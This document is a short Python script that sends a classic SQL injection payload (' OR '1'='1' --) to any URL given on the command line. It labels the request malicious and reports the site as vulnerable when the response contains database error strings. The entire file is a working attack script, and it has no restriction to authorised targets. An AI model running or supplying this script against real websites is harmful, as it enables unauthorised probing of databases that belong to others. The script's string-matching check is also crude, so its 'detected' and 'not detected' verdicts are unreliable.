import requests

def sql_injection(url):
    """
    Simulates an SQL Injection test on the provided URL by appending a typical payload.

    Args:
        url (str): The target URL to test.

    Returns:
        str: Result of the SQL injection attempt.
    """
    payload = "' OR '1'='1' -- "
    target_url = f"{url}?input={payload}"

    try:
        # Send the malicious request
        response = requests.get(target_url, timeout=10)
        response.raise_for_status()  # Raise for HTTP errors

        # Simulate checking for SQL injection success
        if "SQL syntax" in response.text or "mysql" in response.text.lower():
            return f"SQL Injection detected on {url} with payload {payload}"
        else:
            return f"No SQL Injection vulnerability detected on {url}"
    except requests.exceptions.RequestException as e:
        return f"Failed to test {url}. Error: {e}"

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python sql_injection_script.py <url>")
        sys.exit(1)

    target_url = sys.argv[1]
    print(sql_injection(target_url))
